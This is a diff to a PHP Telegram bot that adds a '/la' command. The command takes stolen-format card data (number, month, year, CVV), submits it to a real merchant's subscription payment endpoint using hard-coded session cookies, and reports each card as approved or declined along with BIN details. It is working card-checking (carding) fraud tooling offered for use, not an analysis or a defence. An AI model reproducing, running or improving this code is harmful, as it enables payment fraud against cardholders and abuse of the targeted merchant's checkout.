@@ -1738,7 +1738,101 @@ ob_flush();
 
 
 
+elseif((strpos($message, "!la") === 0)||(strpos($message, "/la") === 0)||(strpos($message, ".la") === 0)){
+                                                                                                     $lista = substr($message, 4);
+$i     = explode("|", $lista);
+$cc    = $i[0];                                                                                      $mes   = $i[1];
+$ano  = trim(substr($i[2], -2));
+$ano1  = $i[2];                                                                                      $cvv   = $i[3];
 
+$bin = substr($lista, 0, 6);                                                                         $ma = "$mes+%2F+$ano";
+
+////                                                                                                 $num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//
+$verify = substr($cc, 16, 1);                                                                        if($verify != ""){
+$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}                                                                                                    
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+}else{                                                                                               $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !la cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .la cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);                                                       die();
+}
+                                                                                                     
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";                                                         sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");                                                                  //----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.lagreeod.com/register/validate_subscribe_step_3',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'card%5Bname%5D=Rigo&card%5Bnumber%5D='.$cc.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&card%5Bcvc%5D='.$cvv.'&coupon=&s1=6&sum=13',
+  CURLOPT_COOKIE => 'sucuri_cloudproxy_uuid_e639e2cfa=03365a00e58f850814a79f58c1212df8; ci_session=3sfatb97g645fkgddu82s52us79flfp7',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'accept-language: es-US,es;q=0.5',
+    'origin: https://www.lagreeod.com',
+    'referer: https://www.lagreeod.com/subscribe-payment',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+$data = json_decode($response, true);
+$respo = $data['message'];
+curl_close($curl);
+
+///VERIFICA EL TINPO DE PROCESAMIENTO///
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = False;
+} else {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $live = False;
+}
+
+if ($live) {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+}
+	
 
 elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){
 
